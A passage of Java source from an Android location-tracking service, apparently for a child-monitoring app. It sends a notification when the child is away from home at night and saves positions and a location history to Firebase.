                    geoFire.queryAtLocation(loc,(double) c.getMetter()/1000);
                    geoQuery.addGeoQueryEventListener(LocationUpdatesService.this);

                }
                for(CircleZone cZ : circleZones) if(cZ.getLongitude() == circle.getCenter().longitude && cZ.getLongitude() == circle.getCenter().latitude)
                    circleZones.remove(cZ);

            }

            @Override
            public void onCancelled(DatabaseError databaseError) {
                Log.e(TAG, "onCancelled", databaseError.toException());
            }
        });

    }*/


    private void childMaisonNot(){
        /*boolean summer =true;*/
        /*Log.d(TAG, "notifchildMaisonNot: "+isInMaison +" "+maison.isSended()+ " "+(isInMaison == false && maison.isSended()== false));*/
         if(isInMaison==false && maison.isSended() == false){
             Log.d(TAG, "notifchildMaisonNot: if");
             Date d = new Date();
             Calendar cal = Calendar.getInstance();
             cal.setTime(d);
             if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                 OffsetDateTime now = OffsetDateTime.now(ZoneOffset.UTC);
                 /*Log.d(TAG, "childMaisonNot: "+now.getHour());*/
                 SimpleDateFormat format = new SimpleDateFormat("yyyyMMddHHmmss");
                 Calendar univCalendar = Calendar.getInstance();
                 /*Log.d(TAG, "childMaisonNot: "+now);*/

                 String year = now.toString().split("T")[0].split("-")[0];
                 String month = now.toString().split("T")[0].split("-")[1];
                 String day = now.toString().split("T")[0].split("-")[2];
                 String hours =  now.toString().split("T")[1].split(":")[0];
                 String minute = now.toString().split("T")[1].split(":")[1];
                 String seconds = now.toString().split("T")[1].split(":")[2];
                 String form = year+month+day+hours+minute+seconds;
                 /*Log.d(TAG, "childMaisonNot: "+form);*/
                 try {
                     Date date = format.parse(form);
                     /*Log.d(TAG, "childMaisonNot: "+date);*/
                     univCalendar.setTime(date);
                 } catch (Exception e) {
                     e.printStackTrace();
                 }
                 if((cal.toInstant().toEpochMilli()-univCalendar.toInstant().toEpochMilli())/(60*60*1000) >=2){
                     //Summer
                     Log.d(TAG, "notifchildMaisonNot: yes summer" +cal.get(cal.HOUR) );
                     Log.d(TAG, "notifchildMaisonNot: "+cal);
                     if(cal.get(cal.HOUR_OF_DAY) >= 19 || (cal.get(cal.HOUR_OF_DAY)>=0 && cal.get(cal.HOUR_OF_DAY)<=7)){
                         maison.notifyNotInMaison();
                         sendNotDate=new Date();
                     }
                 }else if(cal.toInstant().toEpochMilli()-univCalendar.toInstant().toEpochMilli()/(60*60*1000)>=1){
                     //hiver
                     /*summer=false;*/
                      Log.d(TAG, "notifchildMaisonNot: hiver");
                     if(cal.get(cal.HOUR_OF_DAY) >= 17 || (cal.get(cal.HOUR_OF_DAY)>=0 && cal.get(cal.HOUR_OF_DAY)<=7)){
                         maison.notifyNotInMaison();
                         sendNotDate=new Date();
                     }
                 }
             }
         }
         else if(maison.isSended()==true && isInMaison==false){
             Date now  = new Date();
             Calendar calNow = Calendar.getInstance();
             Calendar calLastNot = Calendar.getInstance();
             calNow.setTime(now);
             calLastNot.setTime(sendNotDate);
             if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                 double heure = (calNow.toInstant().toEpochMilli() - calLastNot.toInstant().toEpochMilli())/(60.0*60.0*1000.0);
                 /*double minute = (heure * 60);*/
                 /*Log.d(TAG, "childMaisonNot: heure"+heure);
                 Log.d(TAG, "childMaisonNot: minute"+minute);*/
                 if(heure>=1.0){
                     maison.setSended(false);
                 }
             }
         }


    }

    public void SavetoServer(double latitude, double longitude){
        childMaisonNot();

        zones.settingGeoFire(latitude,longitude);
        /*medium.settingGeoFire();*/


        currentLocalisation.get().addOnCompleteListener(new OnCompleteListener<DataSnapshot>() {
            @Override
            public void onComplete(@NonNull Task<DataSnapshot> task) {
                if (!task.isSuccessful()) {
                    Log.e("firebase", "Error getting data", task.getException());
                }
               /* if(Double.parseDouble(p.getLatitude()+"".substring(0,(int)p.getLatitude()+"".indexOf(".")+5))
                        == Double.parseDouble(latitude+"".substring(0,(int)latitude+"".indexOf(".")+5))
                        && Double.parseDouble(p.getLongtitude()+"".substring(0,(int)p.getLongtitude()+"".indexOf(".")+5))
                        == Double.parseDouble(longitude+"".substring(0,(int)longitude+"".indexOf(".")+5))){*/
                else {
                    Log.d("firebase", String.valueOf(task.getResult().getValue()));
                    Position p =  task.getResult().getValue(Position.class);
                    if(p.getLatitude() == latitude && p.getLongtitude() == longitude){
                        Log.i("Data","I will not insert");
                    }else{
                        Position pos = new Position(new Date(),latitude,longitude);
                        currentLocalisation.setValue(pos);
                        localisationTracker.child(new Date().toString()).setValue(pos);

                    }

                }
            }
        });
    }


}